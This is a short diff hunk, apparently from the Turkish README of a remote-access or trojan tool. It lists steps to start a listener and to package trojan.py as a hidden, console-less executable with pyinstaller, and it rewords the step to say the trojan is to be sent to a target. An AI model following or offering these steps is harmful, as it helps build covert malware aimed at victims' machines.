@@ -49,5 +49,5 @@ pip install -r requirements.txt
 # 2. Dinleyiciyi (Listener) başlatın
 python listener.py
 
-# 3. Payloadı oluşturun
+# 3. Hedefe gönderilecek trojanı oluşturun
 pyinstaller --onefile --noconsole trojan.py
